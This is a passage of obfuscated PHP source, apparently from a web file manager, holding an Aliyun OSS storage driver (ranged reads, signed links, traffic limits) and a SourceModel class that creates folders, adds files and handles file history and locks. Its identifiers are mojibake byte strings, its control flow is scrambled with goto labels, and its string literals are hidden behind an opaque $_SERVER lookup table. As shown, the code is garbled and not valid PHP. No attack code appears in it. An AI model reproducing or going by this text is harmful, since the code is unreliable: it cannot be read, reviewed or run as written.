false) { if ($C» ¹î•Ø™ === -1) { $E¬«¯ğ£¬ = array(); } else { if ($C¡‡¡±¦ğ === !1) { $bÁùçÓˆ…Ÿ = $this->size($d—Î÷–¶); } else { $bÁùçÓˆ…Ÿ = $C» ¹î•Ø™ + $C¡‡¡±¦ğ - 1; } $E¬«¯ğ£¬ = array(OSS\OssClient::OSS_RANGE => "{$C» ¹î•Ø™}\55{$bÁùçÓˆ…Ÿ}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($d—Î÷–¶), $E¬«¯ğ£¬); } catch (OSS\Core\OssException $cõ¹²ÁäªË) { think_exception($cõ¹²ÁäªË->getMessage()); return !1; } } private function trafficLimit($AŒÈÇÑ× ¼, $a¾±”ØçÙ = array()) { goto CÂöª§ãœ¶; CÂöª§ãœ¶: $AÕ×‚‹Å¢Ò =& $_SERVER[›é¼±]; if ($AŒÈÇÑ× ¼ == $AÕ×‚‹Å¢Ò[1320] && $this->isUploadServer() || $AŒÈÇÑ× ¼ == $AÕ×‚‹Å¢Ò[109] && $this->isFileOutServer()) { return $a¾±”ØçÙ; } $d¾ Å”·õ = floatval($GLOBALS[$AÕ×‚‹Å¢Ò[6]][$AÕ×‚‹Å¢Ò[88]][$AÕ×‚‹Å¢Ò[107]][$AŒÈÇÑ× ¼]) * 1024 * 1024 * 8; goto Eíí‘Î ùó; Eíí‘Î ùó: if (!$d¾ Å”·õ) { return $a¾±”ØçÙ; } $d¾ Å”·õ = $d¾ Å”·õ < 819200 ? 819200 : ($d¾ Å”·õ > 838860800 ? 838860800 : $d¾ Å”·õ); $a¾±”ØçÙ[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($d¾ Å”·õ); goto Dğ¸ÕáœÀ’; Dğ¸ÕáœÀ’: return $a¾±”ØçÙ; goto Fä…¶àÖäÅ; Fä…¶àÖäÅ: } public function link($cĞ´çŠÎİµ, $FèãˆêÚª½ = array()) { $Cõ£ˆ„î˜ =& $_SERVER[›é¼±]; if (!$this->exist($cĞ´çŠÎİµ) || $this->isFolder($cĞ´çŠÎİµ)) { return !1; } try { $FèãˆêÚª½ = $this->trafficLimit($Cõ£ˆ„î˜[109], $FèãˆêÚª½); $b¨«åªè¥ = $this->client->signUrl($this->bucket, $this->pathEncode($cĞ´çŠÎİµ), 3600 * 12, $Cõ£ˆ„î˜[228], $FèãˆêÚª½); return $this->getCdnLink($b¨«åªè¥); } catch (OSS\Core\OssException $cÙ¢ÕªßÈ) { return !1; } } public function fileOut($a±äá•¿÷, $d¥ˆÏ­ù‹¥ = false, $d„–õˆŞ†š = false, $a¥Ì»­îÉ = '') { goto bÂĞŞº©”’; bÜÏŠ³‰Ú: $d„–õˆŞ†š = rawurlencode($d„–õˆŞ†š); $a†â²Åªá = get_file_mime(get_path_ext($d„–õˆŞ†š)); if ($a†â²Åªá == $eï±½”ªÎ¡[213]) { return parent::fileOut($a±äá•¿÷, $d¥ˆÏ­ù‹¥, $d„–õˆŞ†š, $a¥Ì»­îÉ); } goto eøø´—´ôŠ; Cº®‰¸Ì: $d‘Õø±‘ = $this->link($a±äá•¿÷, $e¸Èƒ’Ë); $this->fileOutLink($d‘Õø±‘); goto a£®éîİˆ; eøø´—´ôŠ: $d¥ˆÏ­ù‹¥ = $d¥ˆÏ­ù‹¥ ? $eï±½”ªÎ¡[214] : $eï±½”ªÎ¡[215]; $e¸Èƒ’Ë = array(OSS\OssClient::OSS_SUB_RESOURCE => $eï±½”ªÎ¡[1331] . rawurlencode("{$d¥ˆÏ­ù‹¥}\73\x66\x69\154\145\156\141\x6d\145\75{$d„–õˆŞ†š}")); $e¸Èƒ’Ë[OSS\OssClient::OSS_SUB_RESOURCE] .= $eï±½”ªÎ¡[1332] . rawurlencode($a†â²Åªá); goto Cº®‰¸Ì; bÂĞŞº©”’: $eï±½”ªÎ¡ =& $_SERVER[›é¼±]; if ($this->isFileOutServer()) { return $this->fileOutServer($a±äá•¿÷, $d¥ˆÏ­ù‹¥, $d„–õˆŞ†š, $a¥Ì»­îÉ); } if (!$d„–õˆŞ†š) { $d„–õˆŞ†š = $this->pathThis($a±äá•¿÷); } goto bÜÏŠ³‰Ú; a£®éîİˆ: } public function fileOutServer($Dê‡ê›¶É, $C¢¼Ê„Ì‚ë = false, $a¶†¬·Ğ = false, $A¼³¯Ù¬¨Î = '') { parent::fileOut($Dê‡ê›¶É, $C¢¼Ê„Ì‚ë, $a¶†¬·Ğ, $A¼³¯Ù¬¨Î); } public function fileOutImage($a²‰åØ‡„, $A«èùË×î = 250) { $E»Ó®ÁÇíŸ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[›é¼±][1333] . $A«èùË×î); $fêÊ‘­’¹˜ = $this->link($a²‰åØ‡„, $E»Ó®ÁÇíŸ); $this->fileOutLink($fêÊ‘­’¹˜); } public function fileOutImageServer($bŒ°é°õ¦, $EçƒÑÎˆ« = 250) { parent::fileOutImage($bŒ°é°õ¦, $EçƒÑÎˆ«); } public function fileOutLink($a³…×…‹ƒ«) { $Cíà×•à§‹ =& $_SERVER[›é¼±]; if (!$this->isCdnHost() && substr($a³…×…‹ƒ«, 0, 7) == $Cíà×•à§‹[1237]) { $a³…×…‹ƒ« = $Cíà×•à§‹[1238] . substr($a³…×…‹ƒ«, 7); } header($Cíà×•à§‹[159] . $a³…×…‹ƒ«); die; } public function hashMd5($F¡»˜êŞù, $D±Ñô¢Ä = '') { $f´›¢Êê‰³ =& $_SERVER[›é¼±]; $FÜğÏºç· = $this->_objectMeta($F¡»˜êŞù); if (!$FÜğÏºç·) { return $f´›¢Êê‰³[33]; } if (!isset($FÜğÏºç·[$f´›¢Êê‰³[1310]]) && !empty($D±Ñô¢Ä)) { $AïŠî— = $this->updateObjMeta($F¡»˜êŞù, array($f´›¢Êê‰³[1310] => $D±Ñô¢Ä)); $FÜğÏºç·[$f´›¢Êê‰³[1310]] = $AïŠî— ? $D±Ñô¢Ä : $f´›¢Êê‰³[33]; } return isset($FÜğÏºç·[$f´›¢Êê‰³[1310]]) ? strtolower($FÜğÏºç·[$f´›¢Êê‰³[1310]]) : $f´›¢Êê‰³[33]; } public function size($F–×Ë…»å) { $AĞ †“„ = $this->objectMeta($F–×Ë…»å); return $AĞ †“„ ? $AĞ †“„[$_SERVER[›é¼±][78]] : 0; } public function info($FâÉëÊÑº) { if ($this->isFolder($FâÉëÊÑº)) { return $this->folderInfo($FâÉëÊÑº); } else { if ($this->isFile($FâÉëÊÑº)) { return $this->fileInfo($FâÉëÊÑº); } } return !1; } public function exist($Eˆ• Ö¨Å) { return $this->isFile($Eˆ• Ö¨Å) || $this->isFolder($Eˆ• Ö¨Å); } public function isFile($F°Ç¾ÚĞ„÷) { return !$this->isFolder($F°Ç¾ÚĞ„÷) && $this->objectMeta($F°Ç¾ÚĞ„÷); } public function isFolder($E©•¬Ï‘Í) { return $this->cacheMethod($_SERVER[›é¼±][199], $E©•¬Ï‘Í); } protected function objectMeta($CÀ–íÈºÌ·) { return $this->cacheMethod($_SERVER[›é¼±][200], $CÀ–íÈºÌ·); } protected function _objectMeta($d˜Æ²äÌ‰Ô) { $AÆˆŒ¥Âñ =& $_SERVER[›é¼±]; try { $añÍÙ¹Ûª‡ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($d˜Æ²äÌ‰Ô)); } catch (OSS\Core\OssException $eÚæßì¬Ãâ) { $añÍÙ¹Ûª‡ = !1; } if ($añÍÙ¹Ûª‡) { $añÍÙ¹Ûª‡[$AÆˆŒ¥Âñ[78]] = intval($añÍÙ¹Ûª‡[$AÆˆŒ¥Âñ[1308]]); } return $añÍÙ¹Ûª‡; } protected function _isFolder($aÅ‚ŠœÚ‡ç) { $cëóÑËŠì =& $_SERVER[›é¼±]; if ($aÅ‚ŠœÚ‡ç == $cëóÑËŠì[33] || $aÅ‚ŠœÚ‡ç == $cëóÑËŠì[8]) { return !0; } $B›’˜ÎÕÀ¢ = array($cëóÑËŠì[1304] => $cëóÑËŠì[8], $cëóÑËŠì[1305] => rtrim($aÅ‚ŠœÚ‡ç, $cëóÑËŠì[8]) . $cëóÑËŠì[8], $cëóÑËŠì[1306] => 1, $cëóÑËŠì[1307] => $cëóÑËŠì[33]); $F„ÆóŒ¼ = $this->client->listObjects($this->bucket, $B›’˜ÎÕÀ¢); if ($F„ÆóŒ¼->getObjectList() || $F„ÆóŒ¼->getPrefixList()) { return !0; } return !1; } } goto a‘İ®¦à›£; E¢ÒğæíÀÀ: class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($B¼„ÀÃ…¢±) { $BòøÏ²ßÃé =& $_SERVER[›é¼±]; $d¨ñ‰“¦ = Model($BòøÏ²ßÃé[507])->where(array($BòøÏ²ßÃé[1555] => $B¼„ÀÃ…¢±))->find(); $AÓ’æî £Ñ = $this->_mkdirRoot(SourceModel::TYPE_USER, $B¼„ÀÃ…¢±, $d¨ñ‰“¦[$BòøÏ²ßÃé[28]]); $this->userDesktopAdd($AÓ’æî £Ñ); return $AÓ’æî £Ñ; } public function userDesktopAdd($fËĞÜõ²µ´) { $AŒ¥µá¬­ =& $_SERVER[›é¼±]; $f®†Õ¡¢¼Ö = LNG($AŒ¥µá¬­[1993]); $då“·•©ñ = $this->mkdir($fËĞÜõ²µ´, $f®†Õ¡¢¼Ö); $this->metaSet($då“·•©ñ, $AŒ¥µá¬­[1994], $AŒ¥µá¬­[87]); $this->metaSet($fËĞÜõ²µ´, $AŒ¥µá¬­[1995], $då“·•©ñ); } public function groupRootAdd($aˆ¸èƒ¥¸‰) { $fâº›Ç®¦¹ =& $_SERVER[›é¼±]; $E•³°ã‰éÚ = Model($fâº›Ç®¦¹[516])->where(array($fâº›Ç®¦¹[1817] => $aˆ¸èƒ¥¸‰))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $aˆ¸èƒ¥¸‰, $E•³°ã‰éÚ[$fâº›Ç®¦¹[28]]); } public function systemRootPathAdd($FÊ‘îĞÕ…) { if ($FÊ‘îĞÕ… != $_SERVER[›é¼±][531]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $FÊ‘îĞÕ…); } public function userRootRemove($FÃÎ¨Ìíà) { $DíĞáËÃ¨ = $this->sourceRoot(SourceModel::TYPE_USER, $FÃÎ¨Ìíà); if (!$DíĞáËÃ¨) { return; } $this->remove($DíĞáËÃ¨, !1); } public function groupRootRemove($fƒöÓÙÚÃæ) { $Cˆ¾Ï‡¡ ö = $this->sourceRoot(SourceModel::TYPE_GROUP, $fƒöÓÙÚÃæ); if (!$Cˆ¾Ï‡¡ ö) { return; } $this->remove($Cˆ¾Ï‡¡ ö, !1); } private function _mkdirRoot($A×Œğˆå¸—, $bÅèÒŞŞ¡ñ, $b—Ûğ‹÷™©) { goto BãéÙõô‰‘; BãéÙõô‰‘: $Fˆ¿éÒãÍ =& $_SERVER[›é¼±]; $b—…·Šùß¨ = array($Fˆ¿éÒãÍ[396] => 0, $Fˆ¿éÒãÍ[574] => $A×Œğˆå¸—, $Fˆ¿éÒãÍ[575] => $bÅèÒŞŞ¡ñ, $Fˆ¿éÒãÍ[571] => 1, $Fˆ¿éÒãÍ[576] => USER_ID, $Fˆ¿éÒãÍ[577] => USER_ID, $Fˆ¿éÒãÍ[572] => $Fˆ¿éÒãÍ[33], $Fˆ¿éÒãÍ[578] => $Fˆ¿éÒãÍ[525], $Fˆ¿éÒãÍ[424] => 0, $Fˆ¿éÒãÍ[573] => 0, $Fˆ¿éÒãÍ[462] => 0, $Fˆ¿éÒãÍ[579] => $Fˆ¿éÒãÍ[33]); if ($c‚ÙÚ –Ş = $this->where($b—…·Šùß¨)->find()) { return $c‚ÙÚ –Ş[$Fˆ¿éÒãÍ[397]]; } goto C„ƒğóÈ¿´; d¶ö¬™öƒ÷: $e½ƒƒ‰³ÚÖ = $this->add($b—…·Šùß¨); $e£ÃÈä¢·‡ = array($Fˆ¿éÒãÍ[580] => short_id($e½ƒƒ‰³ÚÖ)); $this->where(array($Fˆ¿éÒãÍ[412] => $e½ƒƒ‰³ÚÖ))->save($e£ÃÈä¢·‡); goto C‹¢¹§˜¹; C‹¢¹§˜¹: CacheLock::unlock($B§¡ŞñÇŞÜ); return $e½ƒƒ‰³ÚÖ; goto eò×‘•ùÜ; C„ƒğóÈ¿´: $B§¡ŞñÇŞÜ = "\115\157\144\x65\x6c\x53\x6f\165\162\143\x65\x2e\x6d\x6b\144\151\162\122\x6f\x6f\164\x2e{$A×Œğˆå¸—}\x2e{$bÅèÒŞŞ¡ñ}\x2e" . $b—Ûğ‹÷™©; CacheLock::lock($B§¡ŞñÇŞÜ); $b—…·Šùß¨[$Fˆ¿éÒãÍ[28]] = $b—Ûğ‹÷™©; goto d¶ö¬™öƒ÷; eò×‘•ùÜ: } private function sourceRoot($e¡…†Şì, $B˜®àøœÇ, $e£Õ‰Ü›Û = false) { $Eá‹ììÄğ =& $_SERVER[›é¼±]; $Dì…í¦ëÃ = array($Eá‹ììÄğ[396] => 0, $Eá‹ììÄğ[574] => $e¡…†Şì, $Eá‹ììÄğ[575] => $B˜®àøœÇ); if ($aÙÆ©ô”³ = $this->where($Dì…í¦ëÃ)->find()) { return $e£Õ‰Ü›Û ? $aÙÆ©ô”³ : $aÙÆ©ô”³[$Eá‹ììÄğ[397]]; } return !1; } public function sourceRootGroup($aæöæ¾õáÎ) { goto eÄìÂ‹Ëİ; Fª–Îó—¸±: $this->selectPageReset(); $bò§ç«Şø× = $this->limit(count($aæöæ¾õáÎ))->listSource($B‘“íÈ…‡á, 1000); $this->selectPageRestore(); goto aö¶å‹í·ò; aö¶å‹í·ò: return array_to_keyvalue($bò§ç«Şø×[$f‡¡òÊÍ¢[75]], $f‡¡òÊÍ¢[498]); goto C¿‘—õ×¸¤; eÄìÂ‹Ëİ: $f‡¡òÊÍ¢ =& $_SERVER[›é¼±]; if (is_string($aæöæ¾õáÎ)) { $aæöæ¾õáÎ = array($aæöæ¾õáÎ); } $B‘“íÈ…‡á = array($f‡¡òÊÍ¢[396] => 0, $f‡¡òÊÍ¢[575] => array($f‡¡òÊÍ¢[7], $aæöæ¾õáÎ), $f‡¡òÊÍ¢[574] => SourceModel::TYPE_GROUP); goto Fª–Îó—¸±; C¿‘—õ×¸¤: } public function mkfile($A¯×¸Ó¨õ†, $bˆê†©ÒÒï, $d¸“×®±ÜÍ = '', $BÚ›¸‡öÌ = REPEAT_RENAME) { $dÆ‘……÷²¬ =& $_SERVER[›é¼±]; $Fœ×­ÜŒ½“ = Model($dÆ‘……÷²¬[597])->addFileByContent($d¸“×®±ÜÍ, $bˆê†©ÒÒï); return $this->_createFileCall($A¯×¸Ó¨õ†, $bˆê†©ÒÒï, $Fœ×­ÜŒ½“, $BÚ›¸‡öÌ, $dÆ‘……÷²¬[1249]); } public function addFile($AÃ—‰©„ æ, $EöĞğÏèÚª, $EŞº³†Ç³, $c±áÏ´´³ = false, $cõÓ¤„Œ¹ = REPEAT_RENAME) { $DáÌÇ¼¤É‚ = Model($_SERVER[›é¼±][597])->addFile($EöĞğÏèÚª, $EŞº³†Ç³, $c±áÏ´´³); return $this->_createFileCall($AÃ—‰©„ æ, $EŞº³†Ç³, $DáÌÇ¼¤É‚, $cõÓ¤„Œ¹); } public function addFileByFileID($Bœâ•ˆ”å, $dï”Š®Ä•, $fáÜø¤‡…Ö, $fÛ‰Ÿ·¢å™ = REPEAT_RENAME) { $fœÜå·è®Ó =& $_SERVER[›é¼±]; $C˜Óä‡÷ = Model($fœÜå·è®Ó[597])->find($dï”Š®Ä•); Model($fœÜå·è®Ó[597])->linkAdd($dï”Š®Ä•); return $this->_createFileCall($Bœâ•ˆ”å, $fáÜø¤‡…Ö, $C˜Óä‡÷, $fÛ‰Ÿ·¢å™); } public function addFileByRemote($C×ºóçÀíó, $d¯”Ô˜¨†, $aÏ—¸¯‰³«, $d§óÍˆ©…³ = array(), $E…í¸é×‚° = REPEAT_RENAME) { $E¡³øÈÖô = Model($_SERVER[›é¼±][597])->addFileByRemote($d¯”Ô˜¨†, $aÏ—¸¯‰³«, $d§óÍˆ©…³); return $this->_createFileCall($C×ºóçÀíó, $aÏ—¸¯‰³«, $E¡³øÈÖô, $E…í¸é×‚°); } private function _createFileCall($fç¹ÕÆŸÂ¨, $d£„¸„Â‰Æ, $dÉ¿ÓğÎîº, $cí‹‹‡­´Á, $cá°•³µ‰» = "\x75\160\x6c\157\x61\x64") { goto A÷ßìÚµ‚; a¾½ÒÉ·ÜÌ: $this->lockWriteStart($fç¹ÕÆŸÂ¨, $d£„¸„Â‰Æ); $f™ËÕÁ° = $this->fileNameExist($fç¹ÕÆŸÂ¨, $d£„¸„Â‰Æ); $eÒÊ—Ÿ ’Ò = $this->_createFile($fç¹ÕÆŸÂ¨, $d£„¸„Â‰Æ, $dÉ¿ÓğÎîº, $cí‹‹‡­´Á, $d¡¸õïÑŒÑ); goto fô‚œ­ğ; F½ƒ¿·‰Ç : return $eÒÊ—Ÿ ’Ò; goto F¢•È¦åèô; A÷ßìÚµ‚: $C´ì‚ÜæíÀ =& $_SERVER[›é¼±]; $d¡¸õïÑŒÑ = !1; $this->setMasterDB(); goto a¾½ÒÉ·ÜÌ; fô‚œ­ğ: if (!$d¡¸õïÑŒÑ) { Model($C´ì‚ÜæíÀ[464])->remove($dÉ¿ÓğÎîº[$C´ì‚ÜæíÀ[461]]); } if ($d¡¸õïÑŒÑ && $eÒÊ—Ÿ ’Ò && $eÒÊ—Ÿ ’Ò != $f™ËÕÁ°) { Model($C´ì‚ÜæíÀ[1966])->eventCreate($eÒÊ—Ÿ ’Ò, $cá°•³µ‰»); } $this->lockWriteEnd($fç¹ÕÆŸÂ¨, $d£„¸„Â‰Æ); goto F½ƒ¿·‰Ç ; F¢•È¦åèô: } public function mkdir($A›¹äİŠè, $A·¦µ–ÒãŠ, $A’’¤¼Ë¤ = REPEAT_SKIP) { goto b§ˆ±ÔŞèÊ; A…¨çáÑÅ©: $f‡¤°İÍÃ = array($AÒ´ô™Ÿ¦Ì[571] => 1, $AÒ´ô™Ÿ¦Ì[415] => $A·¦µ–ÒãŠ, $AÒ´ô™Ÿ¦Ì[572] => $AÒ´ô™Ÿ¦Ì[33], $AÒ´ô™Ÿ¦Ì[462] => 0, $AÒ´ô™Ÿ¦Ì[573] => 0); $EòÜÔØ¬Ÿ§ = $this->_addSoure($f‡¤°İÍÃ, $D¢ëİäÃ÷); Model($AÒ´ô™Ÿ¦Ì[1966])->eventCreate($EòÜÔØ¬Ÿ§, $AÒ´ô™Ÿ¦Ì[1250]); goto cä“Íœ³Çö; cä“Íœ³Çö: $this->lockWriteEnd($A›¹äİŠè, $A·¦µ–ÒãŠ); return $EòÜÔØ¬Ÿ§; goto Fµ„—ì£ù‚; b§ˆ±ÔŞèÊ: $AÒ´ô™Ÿ¦Ì =& $_SERVER[›é¼±]; $this->setMasterDB(); $D¢ëİäÃ÷ = $this->sourceInfo($A›¹äİŠè); goto Dí¬ÕÚˆô×; Dí¬ÕÚˆô×: if (!$D¢ëİäÃ÷) { return !1; } $this->lockWriteStart($A›¹äİŠè, $A·¦µ–ÒãŠ); if ($A’’¤¼Ë¤ !== !1) { $a‚ÂµÜÉÎç = $this->fileNameExist($A›¹äİŠè, $A·¦µ–ÒãŠ); if ($a‚ÂµÜÉÎç && $A’’¤¼Ë¤ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($A›¹äİŠè, $A·¦µ–ÒãŠ); return $a‚ÂµÜÉÎç; } $A·¦µ–ÒãŠ = $this->fileNameAuto($A›¹äİŠè, $A·¦µ–ÒãŠ, $A’’¤¼Ë¤); } goto A…¨çáÑÅ©; Fµ„—ì£ù‚: } private function _createFile($dÄ®ñ”¢Ê‚, $E‰›Èñ½è¼, $bñÚê¸ìÉ¹, $aó½¤‡Ìï§, &$EĞÏÏ©íÅ) { goto CÙÎÉ¹®…; CÙÎÉ¹®…: $dËÕÈˆëÎ =& $_SERVER[›é¼±]; $D„¾Ç¨‹í = $this->sourceInfo($dÄ®ñ”¢Ê‚); if (!$bñÚê¸ìÉ¹ || !$D„¾Ç¨‹í) { return !1; } goto C¸–ïÒËª–; C¸–ïÒËª–: if ($aó½¤‡Ìï§ !== !1) { $B¬Ü°òÜİ¤ = $this->fileNameExist($dÄ®ñ”¢Ê‚, $E‰›Èñ½è¼); } $EĞÏÏ©íÅ = !0; if ($aó½¤‡Ìï§ && $B¬Ü°òÜİ¤) { if ($aó½¤‡Ìï§ == REPEAT_SKIP) { $EĞÏÏ©íÅ = !1; return $B¬Ü°òÜİ¤; } else { if ($aó½¤‡Ìï§ == REPEAT_REPLACE) { $c„í†¶ƒĞí = $this->sourceInfo($B¬Ü°òÜİ¤); $F¹ë ª†ã = $this->fileHistory($c„í†¶ƒĞí, $bñÚê¸ìÉ¹[$dËÕÈˆëÎ[461]], $bñÚê¸ìÉ¹[$dËÕÈˆëÎ[78]]); if (!$F¹ë ª†ã) { $EĞÏÏ©íÅ = !1; } else { $this->folderSizeReset($dÄ®ñ”¢Ê‚); } return $B¬Ü°òÜİ¤; } else { $E‰›Èñ½è¼ = $this->fileNameAuto($dÄ®ñ”¢Ê‚, $E‰›Èñ½è¼, $aó½¤‡Ìï§, !1); } } } goto dõÑÙ÷ä›; dõÑÙ÷ä›: $føñîµøÉ´ = array($dËÕÈˆëÎ[571] => 0, $dËÕÈˆëÎ[415] => $E‰›Èñ½è¼, $dËÕÈˆëÎ[572] => substr(get_path_ext($E‰›Èñ½è¼), 0, 10), $dËÕÈˆëÎ[462] => $bñÚê¸ìÉ¹[$dËÕÈˆëÎ[461]], $dËÕÈˆëÎ[573] => $bñÚê¸ìÉ¹[$dËÕÈˆëÎ[78]]); $A·‚â‘ØÚÛ = $this->_addSoure($føñîµøÉ´, $D„¾Ç¨‹í); $this->folderSizeReset($dÄ®ñ”¢Ê‚, intval($føñîµøÉ´[$dËÕÈˆëÎ[78]])); goto eù÷¦—Î‹ˆ; eù÷¦—Î‹ˆ: return $A·‚â‘ØÚÛ; goto c™ö®£¤é‰; c™ö®£¤é‰: } protected function fileHistory($Aˆ¯ÓŸŒÃò, $F‚›²ÁØˆÙ, $eò…¾ ÒÊ¹) { goto aõ‹ËŞñ”÷; dÕ£¹‘‹Ù£: $this->checkLock($Aˆ¯ÓŸŒÃò[$BôæÅï‹É¶[397]], $F‚›²ÁØˆÙ); Model($BôæÅï‹É¶[1996])->addHistory($Aˆ¯ÓŸŒÃò); $CßÅò×ø‹À = array($BôæÅï‹É¶[577] => $dè—í³‡Ú, $BôæÅï‹É¶[419] => time(), $BôæÅï‹É¶[461] => $F‚›²ÁØˆÙ, $BôæÅï‹É¶[78] => $eò…¾ ÒÊ¹); goto fœ‰¶³‡é–; fœ‰¶³‡é–: $this->where(array($BôæÅï‹É¶[412] => $Aˆ¯ÓŸŒÃò[$BôæÅï‹É¶[397]]))->save($CßÅò×ø‹À); $this->sourceCacheClear($Aˆ¯ÓŸŒÃò[$BôæÅï‹É¶[397]]); return !0; goto cå—ƒ‘Óô; aõ‹ËŞñ”÷: $BôæÅï‹É¶ =& $_SERVER[›é¼±]; $dè—í³‡Ú = defined($BôæÅï‹É¶[468]) ? USER_ID : $BôæÅï‹É¶[191]; if ($Aˆ¯ÓŸŒÃò[$BôæÅï‹É¶[461]] == $F‚›²ÁØˆÙ) { return !1; } goto dÕ£¹‘‹Ù£; cå—ƒ‘Óô: } public function checkLock($eÅŒÙ¥ˆêè, $A†£™£›ÏÄ) { goto bÖ¥¶±Ğ„; bÖ¥¶±Ğ„: $dÀç‰ª¬¢ =& $_SERVER[›é¼±]; $fëˆ­˜´•Ã = $this->pathInfo($eÅŒÙ¥ˆêè); if (!$this->fileIsLock($fëˆ­˜´•Ã, !0)) { return; } goto c´Œ §Ä; dÜùÒ¦ÆÁÏ: show_json(LNG($dÀç‰ª¬¢[1999]) . $dÀç‰ª¬¢[2000] . LNG($dÀç‰ª¬¢[2001]) . $dÀç‰ª¬¢[2002] . $a˜ßœŒ’½» . $dÀç‰ª¬¢[2003], !1); goto a±ŠÜ‘µší; c´Œ §Ä: $d¾ÕìóÑš• = Session::get($dÀç‰ª¬¢[1997]); $BãÂÏÙ¦›Á = substr($fëˆ­˜´•Ã[$dÀç‰ª¬¢[28]], 0, -1 - strlen($fëˆ­˜´•Ã[$dÀç‰ª¬¢[168]])) . $dÀç‰ª¬¢[1516] . $d¾ÕìóÑš• . $dÀç‰ª¬¢[95] . $fëˆ­˜´•Ã[$dÀç‰ª¬¢[168]]; $B‹ğ òŒÓß = Model($dÀç‰ª¬¢[597])->find($A†£™£›ÏÄ); goto BËÑƒ¥Õ“; BËÑƒ¥Õ“: $this->_createFileCall($fëˆ­˜´•Ã[$dÀç‰ª¬¢[492]], $BãÂÏÙ¦›Á, $B‹ğ òŒÓß, REPEAT_REPLACE, $dÀç‰ª¬¢[1249]); $E•òŠªÂ­“ = $fëˆ­˜´•Ã[$dÀç‰ª¬¢[459]][$dÀç‰ª¬¢[536]]; $a˜ßœŒ’½» = $E•òŠªÂ­“[$dÀç‰ª¬¢[1998]] ? $E•òŠªÂ­“[$dÀç‰ª¬¢[1998]] : $E•òŠªÂ­“[$dÀç‰ª¬¢[28]]; goto dÜùÒ¦ÆÁÏ; a±ŠÜ‘µší: } public function fileIsLock($E‘¹İ¦š‰¶, $eÍäØŸ°‘Ñ = false) { goto Cõ›¢œÀ½; DÉŞŸô•ÆŞ: return !1; goto cÏ¹¼‡è; Cõ›¢œÀ½: $B”ˆ‡À‘Ø =& $_SERVER[›é¼±]; if (!isset($E‘¹İ¦š‰¶[$B”ˆ‡À‘Ø[459]]) || !$E‘¹İ¦š‰¶[$B”ˆ‡À‘Ø[459]][$B”ˆ‡À‘Ø[533]]) { return !1; } if ($E‘¹İ¦š‰¶[$B”ˆ‡À‘Ø[459]][$B”ˆ‡À‘Ø[533]] != USER_ID) { return !0; } goto E¸¬óóÍÙ‰; E¸¬óóÍÙ‰: $C°ÒíñÛóÈ = $GLOBALS[$B”ˆ‡À‘Ø[6]][$B”ˆ‡À‘Ø[88]][$B”ˆ‡À‘Ø[534]]; if ($E‘¹İ¦š‰¶[$B”ˆ‡À‘Ø[459]][$B”ˆ‡À‘Ø[535]] <= time() - $C°ÒíñÛóÈ) { $this->metaSet($E‘¹İ¦š‰¶[$B”ˆ‡À‘Ø[397]], $B”ˆ‡À‘Ø[533], null); $this->metaSet($E‘¹İ¦š‰¶[$B”ˆ‡À‘Ø[397]], $B”ˆ‡À‘Ø[535], null); } if ($eÍäØŸ°‘Ñ) { $this->metaSet($E‘¹İ¦š‰¶[$B”ˆ‡À‘Ø[397]], $B”ˆ‡À‘Ø[535], time()); } goto DÉŞŸô•ÆŞ; cÏ¹¼‡è: } private function _addSoure($Aõ åâ, $a—ˆ‘àŸàˆ) { goto B×àÛ»ŒÂ; FÇÖ‚ÌÒ„İ: $dÆ“¬¿Áó = $this->add($Aõ åâ); $C˜íä‚¨‘ = array($D¨’³“£•ê[580] => short_id($dÆ“¬¿Áó)); $this->where(array($D¨’³“£•ê[412] => $dÆ“¬¿Áó))->save($C˜íä‚¨‘); goto B´ğ”Œ–±Ú; B×àÛ»ŒÂ: $D¨’³“£•ê =& $_SERVER[›é¼±]; $B¨¢È¤ÒŠœ = defined($D¨’³“£•ê[468]) ? USER_ID : $D¨’³“£•ê[191]; $aÆİÂãØÑò = array($D¨’³“£•ê[574] => $a—ˆ‘àŸàˆ[$D¨’³“£•ê[406]], $D¨’³“£•ê[575] => $a—ˆ‘àŸàˆ[$D¨’³“£•ê[498]], $D¨’³“£•ê[576] => $B¨¢È¤ÒŠœ, $D¨’³“£•ê[577] => $B¨¢È¤ÒŠœ, $D¨’³“£•ê[396] => $a—ˆ‘àŸàˆ[$D¨’³“£•ê[397]], $D¨’³“£•ê[578] => $a—ˆ‘àŸàˆ[$D¨’³“£•ê[515]] . $a—ˆ‘àŸàˆ[$D¨’³“£•ê[397]] . $D¨’³“£•ê[47], $D¨’³“£•ê[424] => 0, $D¨’³“£•ê[579] => $D¨’³“£•ê[33]); goto aÎ–»°±; aÎ–»°±: $Aõ åâ = array_merge($aÆİÂãØÑò, $Aõ åâ); $this->updateModifyTime($Aõ åâ[$D¨’³“£•ê[492]]); $Aöµ£’ÏÎ• = $D¨’³“£•ê[2004] . $a—ˆ‘àŸàˆ[$D¨’³“£•ê[397]]; goto D»Ÿ‹ ‰Ó; D»Ÿ‹ ‰Ó: if (isset(self::$cacheChildList[$Aöµ£’ÏÎ•])) { unset(self::$cacheChildList[$Aöµ£’ÏÎ•]); } static $dòºƒ ‰å = false; if (!$dòºƒ ‰å) { Hook::trigger($D¨’³“£•ê[561], $Aõ åâ); $dòºƒ ‰å = !0; } goto FÇÖ‚ÌÒ„İ; B´ğ”Œ–±Ú: $this->setNamePinyin($dÆ“¬¿Áó, $Aõ åâ[$D¨’³“£•ê[28]]); return $dÆ“¬¿Áó; goto e’“ª©§Ä; e’“ª©§Ä: } public function remove($b²ÇÂ²•Ï, $a•Ô¸¸÷‰» = true) { goto A¸Áã†Ùñ†; A¸Áã†Ùñ†: $bò²ÃğôÑ‚ =& $_SERVER[›é¼±]; $DçŠŒ¨² = $this->sourceInfo($b²ÇÂ²•Ï); $E„§ß‚É» = intval($DçŠŒ¨²[$bò²ÃğôÑ‚[406]]) === self::TYPE_SYSTEM; goto CŒŒƒ­æ§¿; b•Á¥Ñ”Äß: CacheLock::lock($fµò¾è·²Ø); $fã®•Ò’ = $this->fileNameExist($d„š¥ë¹¨Ñ, $d¦ØªÂ“ÔĞ); if (!$fã®•Ò’) { $fã®•Ò’ = $this->mkdir($d„š¥ë¹¨Ñ, 